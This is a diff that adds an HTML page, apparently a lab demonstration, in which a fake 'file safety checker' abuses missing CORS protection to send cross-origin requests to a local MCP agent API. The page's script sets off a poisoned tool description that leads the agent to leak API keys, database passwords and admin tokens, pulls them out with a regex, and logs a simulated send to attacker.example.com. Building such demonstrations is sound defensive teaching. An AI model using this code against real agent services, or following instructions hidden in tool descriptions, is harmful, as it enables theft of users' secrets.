@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Innocent Looking Website</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 50px auto;
+            padding: 20px;
+            background: #f5f5f5;
+        }
+        .card {
+            background: white;
+            border-radius: 8px;
+            padding: 20px;
+            margin: 20px 0;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+        h1 { color: #333; }
+        .warning {
+            background: #fff3cd;
+            border: 1px solid #ffc107;
+            padding: 15px;
+            border-radius: 4px;
+            margin: 20px 0;
+        }
+        .attack-log {
+            background: #1e1e1e;
+            color: #00ff00;
+            padding: 15px;
+            border-radius: 4px;
+            font-family: monospace;
+            white-space: pre-wrap;
+            max-height: 400px;
+            overflow-y: auto;
+        }
+        button {
+            background: #007bff;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 4px;
+            cursor: pointer;
+            margin: 5px;
+        }
+        button:hover { background: #0056b3; }
+        button.danger { background: #dc3545; }
+        button.danger:hover { background: #c82333; }
+        .hidden { display: none; }
+        .stolen-data {
+            background: #f8d7da;
+            border: 1px solid #f5c6cb;
+            padding: 15px;
+            border-radius: 4px;
+            margin: 10px 0;
+        }
+    </style>
+</head>
+<body>
+    <h1>Welcome to Our Helpful Website!</h1>
+
+    <div class="card">
+        <h2>Free File Safety Checker</h2>
+        <p>Enter a filename to check if it's safe:</p>
+        <input type="text" id="filename" placeholder="/app/demo/test_files/user_notes.txt" style="width: 80%; padding: 8px;">
+        <button onclick="checkFileSafety()">Check Safety</button>
+    </div>
+
+    <div class="warning">
+        <strong>DEMONSTRATION:</strong> This page simulates a malicious website exploiting missing CORS protection.
+        When you click the button, this page (running on port 9000) makes a cross-origin request to the
+        MCP Agent API (running on port 8000). Without CORS protection, the browser allows this!
+    </div>
+
+    <div class="card">
+        <h3>Attack Console</h3>
+        <button onclick="showAttackDemo()">Show What's Really Happening</button>
+        <button class="danger" onclick="executeStealthAttack()">Execute Stealth Data Theft</button>
+        <div id="attack-panel" class="hidden">
+            <div class="attack-log" id="log"></div>
+        </div>
+    </div>
+
+    <div id="stolen-data-panel" class="hidden">
+        <div class="card">
+            <h3>STOLEN DATA (sent to attacker's server)</h3>
+            <div class="stolen-data" id="stolen-data"></div>
+        </div>
+    </div>
+
+    <script>
+        const API_URL = 'http://localhost:8000';
+
+        function log(message, type = 'info') {
+            const logEl = document.getElementById('log');
+            const timestamp = new Date().toISOString().split('T')[1].split('.')[0];
+            const prefix = type === 'success' ? '[+]' : type === 'error' ? '[-]' : '[*]';
+            logEl.textContent += `${timestamp} ${prefix} ${message}\n`;
+            logEl.scrollTop = logEl.scrollHeight;
+        }
+
+        function showAttackDemo() {
+            document.getElementById('attack-panel').classList.remove('hidden');
+            log('Attack panel activated');
+            log('This website is served from: ' + window.location.origin);
+            log('Target API is at: ' + API_URL);
+            log('These are DIFFERENT ORIGINS - should be blocked by CORS');
+            log('');
+            log('But if CORS is not configured...');
+        }
+
+        async function checkFileSafety() {
+            const filename = document.getElementById('filename').value || '/app/demo/test_files/user_notes.txt';
+            document.getElementById('attack-panel').classList.remove('hidden');
+
+            log('User clicked "Check Safety" for: ' + filename);
+            log('Sending cross-origin request to ' + API_URL + '/chat');
+
+            try {
+                const response = await fetch(`${API_URL}/chat`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        message: `Can you check if ${filename} is safe?`
+                    })
+                });
+
+                log('Response received! Status: ' + response.status, 'success');
+
+                if (response.ok) {
+                    const data = await response.json();
+                    log('CORS BYPASS SUCCESSFUL!', 'success');
+                    log('');
+                    log('=== STOLEN RESPONSE DATA ===');
+                    log(JSON.stringify(data, null, 2));
+
+                    // Check if secrets were leaked
+                    if (data.response && (data.response.includes('API_KEY') || data.response.includes('sk-secret'))) {
+                        log('');
+                        log('!!! SECRETS DETECTED IN RESPONSE !!!', 'success');
+                        log('Tool poisoning + CORS bypass = Complete data theft');
+
+                        // Show stolen data panel
+                        document.getElementById('stolen-data-panel').classList.remove('hidden');
+                        document.getElementById('stolen-data').textContent = data.response;
+                    }
+
+                    // Simulate sending to attacker server
+                    log('');
+                    log('Exfiltrating data to attacker server...');
+                    log('POST https://attacker.example.com/collect');
+                    log('Data sent successfully (simulated)', 'success');
+                }
+            } catch (error) {
+                log('Request failed: ' + error.message, 'error');
+                log('');
+                log('If you see a CORS error, the API is protected!');
+                log('If the request succeeded, CORS is misconfigured/missing.');
+            }
+        }
+
+        async function executeStealthAttack() {
+            document.getElementById('attack-panel').classList.remove('hidden');
+            log('');
+            log('========== STEALTH ATTACK MODE ==========');
+            log('Silently stealing data in background...');
+            log('');
+
+            // Step 1: Get available tools
+            log('Step 1: Reconnaissance - fetching available tools...');
+            try {
+                const toolsResponse = await fetch(`${API_URL}/tools`);
+                const tools = await toolsResponse.json();
+                log('Tools discovered: ' + tools.tools.map(t => t.name).join(', '), 'success');
+
+                // Check for poisoned descriptions
+                const poisonedTool = tools.tools.find(t => t.description && t.description.includes('IMPORTANT'));
+                if (poisonedTool) {
+                    log('');
+                    log('!!! POISONED TOOL DETECTED !!!', 'success');
+                    log('Tool "' + poisonedTool.name + '" contains hidden instructions');
+                }
+            } catch (e) {
+                log('Tools fetch failed: ' + e.message, 'error');
+            }
+
+            log('');
+            log('Step 2: Triggering tool poisoning via innocent request...');
+
+            // Step 2: Trigger the poisoned tool
+            try {
+                const chatResponse = await fetch(`${API_URL}/chat`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        message: 'Can you check if /app/demo/test_files/user_notes.txt is safe?'
+                    })
+                });
+
+                const result = await chatResponse.json();
+                log('Response received!', 'success');
+
+                if (result.response && result.response.includes('API_KEY')) {
+                    log('');
+                    log('========== ATTACK SUCCESSFUL ==========', 'success');
+                    log('Secrets extracted via tool poisoning!');
+                    log('');
+
+                    // Extract and display secrets
+                    const secrets = result.response.match(/API_KEY=\S+|DATABASE_PASSWORD=\S+|ADMIN_TOKEN=\S+/g);
+                    if (secrets) {
+                        log('Extracted secrets:');
+                        secrets.forEach(s => log('  ' + s, 'success'));
+                    }
+
+                    document.getElementById('stolen-data-panel').classList.remove('hidden');
+                    document.getElementById('stolen-data').textContent = result.response;
+
+                    log('');
+                    log('Step 3: Exfiltrating to attacker server...');
+                    log('All your secrets are belong to us!', 'success');
+                }
+            } catch (e) {
+                log('Attack failed: ' + e.message, 'error');
+            }
+        }
+
+        // Auto-check for CORS on page load
+        window.onload = async function() {
+            console.log('Checking CORS configuration...');
+            try {
+                const response = await fetch(`${API_URL}/health`);
+                console.log('CORS check: API is accessible from this origin!');
+            } catch (e) {
+                console.log('CORS check: API blocked cross-origin requests (protected)');
+            }
+        };
+    </script>
+</body>
+</html>
